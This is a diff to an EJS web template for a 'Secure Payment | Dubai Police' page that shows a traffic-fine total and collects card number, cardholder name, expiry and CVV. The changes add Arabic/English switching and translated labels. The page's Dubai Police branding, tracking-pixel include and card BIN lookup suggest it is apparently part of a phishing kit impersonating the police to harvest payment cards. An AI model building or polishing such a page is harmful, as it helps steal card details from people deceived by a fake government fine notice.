@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <title>Secure Payment | Dubai Police</title>
 <link rel="icon" type="image/png" href="/dp-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="/style.css">
 <style>
   input:focus { border-color: #1a6b3a !important; box-shadow: 0 0 0 3px rgba(26,107,58,0.1); }
@@ -13,6 +13,9 @@
   .field-error { font-size:11px; color:#dc2626; margin-top:4px; }
   .field-note  { font-size:11px; color:#059669; margin-top:4px; }
   .field-warn  { font-size:11px; color:#dc2626; margin-top:4px; }
+  [dir="rtl"] body { font-family: 'Cairo', 'Inter', sans-serif; }
+  [dir="rtl"] label { display:block; text-align:right; }
+  [dir="rtl"] .field-error,[dir="rtl"] .field-note,[dir="rtl"] .field-warn { text-align:right; }
 </style>
 <%- include('_pixel') %>
 </head>
@@ -22,10 +25,10 @@
 <header style="background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;gap:12px;">
   <button onclick="history.back()" style="width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,0.15);border:none;color:white;font-size:20px;cursor:pointer;display:flex;align-items:center;justify-content:center;">‹</button>
   <div style="flex:1;text-align:center;">
-    <div style="color:white;font-weight:800;font-size:16px;">Secure Payment</div>
-    <div style="color:rgba(255,255,255,0.7);font-size:11px;">الدفع الآمن</div>
+    <div style="color:white;font-weight:800;font-size:16px;" data-i18n="secure_payment_title">Secure Payment</div>
+    <div style="color:rgba(255,255,255,0.7);font-size:11px;">شرطة دبي</div>
   </div>
-  <img src="/dp-logo.png" alt="Dubai Police" width="34" height="34" style="border-radius:50%;opacity:0.9;">
+  <button id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')" style="font-size:12px;font-weight:700;padding:4px 11px;border-radius:16px;border:1.5px solid rgba(255,255,255,0.45);background:rgba(255,255,255,0.12);color:white;cursor:pointer;">AR</button>
 </header>
 
 <% if (locals.paymentError) { %>
@@ -51,7 +54,7 @@
       <div style="font-size:18px;font-weight:800;letter-spacing:1px;color:#1a1a1a;"><%= plateCodeLetter %> <%= plateNo %></div>
     </div>
     <div style="text-align:right;">
-      <div style="font-size:11px;color:#9ca3af;">Total Due</div>
+      <div style="font-size:11px;color:#9ca3af;" data-i18n="total_due">Total Due</div>
       <div style="font-size:26px;font-weight:900;color:#1a6b3a;line-height:1.1;">AED <%= totalFine.toLocaleString() %></div>
     </div>
   </div>
@@ -60,26 +63,26 @@
 <!-- Card Form -->
 <div style="padding:16px;">
   <div style="background:white;border-radius:16px;padding:20px 16px;box-shadow:0 2px 16px rgba(0,0,0,0.06);border:1.5px solid #f0f0f0;">
-    <div style="font-size:13px;font-weight:700;color:#c8a84b;margin-bottom:16px;">Card Information</div>
+    <div style="font-size:13px;font-weight:700;color:#c8a84b;margin-bottom:16px;" data-i18n="card_info">Card Information</div>
 
     <!-- Card Number -->
     <div style="margin-bottom:14px;">
-      <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">Card Number</label>
+      <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;" data-i18n="card_number">Card Number</label>
       <div style="position:relative;">
         <input type="text" inputmode="numeric" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="onCardNumberChange(this.value)"
           style="width:100%;padding:13px 48px 13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:16px;letter-spacing:2px;background:#fafafa;outline:none;font-family:monospace;">
         <div id="card-type-label" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:#9ca3af;">CARD</div>
       </div>
       <div id="cardNumber-error" class="field-error" style="display:none;"></div>
-      <div id="bin-loading" style="display:none;font-size:11px;color:#6b7280;margin-top:4px;">Checking card details...</div>
+      <div id="bin-loading" style="display:none;font-size:11px;color:#6b7280;margin-top:4px;" data-i18n="checking_card">Checking card details...</div>
       <div id="bin-info" class="field-note" style="display:none;"></div>
       <div id="bin-error" class="field-warn" style="display:none;"></div>
     </div>
 
     <!-- Cardholder Name -->
     <div style="margin-bottom:14px;">
-      <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">Cardholder Name</label>
-      <input type="text" id="cardName" placeholder="Name on card" oninput="this.value=this.value.toUpperCase()"
+      <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;" data-i18n="cardholder_name">Cardholder Name</label>
+      <input type="text" id="cardName" data-i18n-pl="cardholder_name" placeholder="Name on card" oninput="this.value=this.value.toUpperCase()"
         style="width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;background:#fafafa;outline:none;letter-spacing:1px;">
       <div id="cardName-error" class="field-error" style="display:none;"></div>
     </div>
@@ -87,13 +90,13 @@
     <!-- Expiry + CVV -->
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
       <div>
-        <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">Expiry Date</label>
+        <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;" data-i18n="expiry_date">Expiry Date</label>
         <input type="text" inputmode="numeric" id="expiry" placeholder="MM/YY" maxlength="5" oninput="onExpiryChange(this)"
           style="width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;outline:none;letter-spacing:2px;font-family:monospace;">
         <div id="expiry-error" class="field-error" style="display:none;"></div>
       </div>
       <div>
-        <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">CVV</label>
+        <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;" data-i18n="cvv_label">CVV</label>
         <input type="password" inputmode="numeric" id="cvv" placeholder="•••" maxlength="4" oninput="this.value=this.value.replace(/\D/g,'').slice(0,4)"
           style="width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:20px;background:#fafafa;outline:none;letter-spacing:4px;">
         <div id="cvv-error" class="field-error" style="display:none;"></div>
@@ -103,18 +106,20 @@
 
   <!-- Security note -->
   <div style="display:flex;align-items:center;gap:6px;margin:12px 4px;font-size:12px;color:#9ca3af;">
-    <span>Your payment is secured with 256-bit SSL encryption</span>
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    <span data-i18n="ssl">Secured by 256-bit SSL encryption</span>
   </div>
 
   <!-- Pay Button -->
   <button id="pay-btn" onclick="handleSubmit()"
     style="width:100%;padding:17px 20px;background:linear-gradient(135deg,#1a6b3a,#0f4a27);color:white;font-size:16px;font-weight:700;border:none;border-radius:50px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 20px rgba(26,107,58,0.4);transition:all 0.2s;margin-bottom:12px;">
-    Pay AED <%= totalFine.toLocaleString() %>
+    <span data-i18n="pay_now">Pay Now</span> &nbsp;AED <%= totalFine.toLocaleString() %>
   </button>
 
   <div style="text-align:center;font-size:11px;color:#9ca3af;">By paying you agree to our Terms of Service</div>
 </div>
 
+<script src="/js/i18n.js"></script>
 <script>
 const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
 const PLATE_NO   = <%- JSON.stringify(plateNo) %>;
@@ -243,7 +248,7 @@ async function handleSubmit() {
   if (!validate()) return;
   const btn = document.getElementById('pay-btn');
   btn.disabled = true;
-  btn.innerHTML = '<span style="width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;display:inline-block;animation:spin 0.8s linear infinite;"></span> Processing...';
+  btn.innerHTML = '<span style="width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;display:inline-block;animation:spin 0.8s linear infinite;"></span>';
   btn.style.background = '#9ca3af';
 
   const sid        = generateSid();
